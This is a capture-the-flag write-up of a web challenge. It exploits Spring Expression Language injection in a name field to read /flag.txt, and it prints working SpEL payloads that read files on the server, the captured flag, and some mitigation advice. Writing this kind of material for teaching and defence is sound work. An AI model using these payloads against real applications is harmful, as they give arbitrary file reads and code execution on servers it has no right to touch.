# Mariooo (M4) — Web | 350 pts | Medium

**Category:** Web Exploitation  
**Difficulty:** Medium  
**Points:** 350  
**Writeup by:** Circuitx

---

## Challenge Summary

A simple "enter your name" field on a game portal. The page evaluates expressions submitted in the name field, which allows **server-side expression injection**. The flag is located at `/flag.txt`.

---

## Vulnerability Type

**Java Expression Language (EL) Injection** - specifically Spring Expression Language (SpEL)

The application accepts user input and evaluates it as a Java expression without proper sanitization, allowing arbitrary code execution on the server.

---

## Reconnaissance and Fingerprinting

### Initial Testing

The challenge presents an input field where you can enter your name. Upon testing, the input was reflected back, suggesting potential injection vulnerabilities.

### Step 1: Basic Expression Evaluation Test

**Payload:**
```
${{7*7}}
```

**Result:** `49`

This confirmed that the application was evaluating mathematical expressions, indicating an expression language vulnerability.

### Step 2: Java-Specific Probe

**Payload:**
```
${T(java.lang.Math).sqrt(81)}
```

**Result:** `9`

This confirmed that the application was evaluating **Java Expression Language (SpEL/EL)**, as it successfully invoked a Java standard library class method.

**Key Findings:**
- Expression evaluation is enabled
- Java classes can be referenced using `T()` syntax
- Standard Java library is accessible
- No apparent input sanitization

---

## Exploitation Path

Because the application evaluates Java expressions, we can leverage Java standard library classes to read files from the filesystem.

### Attempt 1: Read File as Byte Array

**Payload:**
```java
${T(java.util.Arrays).toString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}
```

**Result:** Byte array representation like `[80, 67, 67, ...]`

This worked but returned the flag as a byte array, which needs conversion to readable text.

**Explanation:**
- `T(java.nio.file.Paths).get('/flag.txt')` - Gets a Path object for the flag file
- `T(java.nio.file.Files).readAllBytes(...)` - Reads all bytes from the file
- `T(java.util.Arrays).toString(...)` - Converts byte array to string representation

### Attempt 2: Direct String Conversion (SUCCESS)

**Payload:**
```java
${new String(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}
```

**Result:** `PCC{m4ri0_i5_cr4zy_hmmm_nEcSO5wQsf2y}`

This successfully converted the byte array to a UTF-8 string, revealing the flag directly.

### Attempt 3: Base64-Encoded (Alternative Method)

If the output is altered, escaped, or truncated, a Base64-safe variant is useful:

**Payload:**
```java
${T(java.util.Base64).getEncoder().encodeToString(T(java.nio.file.Files).readAllBytes(T(java.nio.file.Paths).get('/flag.txt')))}
```

**Local Decode:**
```bash
echo "<base64_string>" | base64 -d
```

This method ensures the flag survives any character encoding issues during transmission.

---

## Flag

```
PCC{m4ri0_i5_cr4zy_hmmm_nEcSO5wQsf2y}
```

---

## Technical Explanation

### What is SpEL Injection?

Spring Expression Language (SpEL) is a powerful expression language that supports querying and manipulating object graphs at runtime. When user input is evaluated as SpEL without proper validation, attackers can:

1. Execute arbitrary Java code
2. Access the Java ClassLoader
3. Read/write files on the server
4. Execute system commands
5. Exfiltrate sensitive data

### Vulnerability Root Cause

The application likely uses code similar to:
```java
// VULNERABLE CODE
String userInput = request.getParameter("name");
Expression exp = parser.parseExpression(userInput);
String result = (String) exp.getValue();
```

### Secure Implementation

To prevent SpEL injection:

1. **Avoid evaluating user input as expressions**
2. **Use parameterized queries** instead of string concatenation
3. **Implement strict input validation** with whitelists
4. **Sandbox the expression evaluation context** if expressions are necessary
5. **Limit available classes and methods** in the evaluation context

Example secure approach:
```java
// SECURE CODE
String userInput = request.getParameter("name");
// Sanitize and validate input
if (userInput.matches("^[a-zA-Z0-9 ]+$")) {
    // Only alphanumeric characters allowed
    output = "Hello, " + userInput;
} else {
    output = "Invalid input";
}
```

---

## Tools and Scripts

See the following files in this directory:

- **`exploit.py`** - Automated Python exploit script
- **`exploit_manual.py`** - Manual exploitation with step-by-step payloads
- **`payloads.txt`** - Collection of tested payloads

---

## References

- [OWASP - Expression Language Injection](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
- [Spring Expression Language (SpEL) Documentation](https://docs.spring.io/spring-framework/docs/current/reference/html/core.html#expressions)
- [SpEL Injection: A Comprehensive Guide](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#java---basic-injection)

---

## One-Line Summary

An input field allowed Java EL evaluation; reading `/flag.txt` with `java.nio.file.Files.readAllBytes` and converting to a string produced the flag: **PCC{m4ri0_i5_cr4zy_hmmm_nEcSO5wQsf2y}**
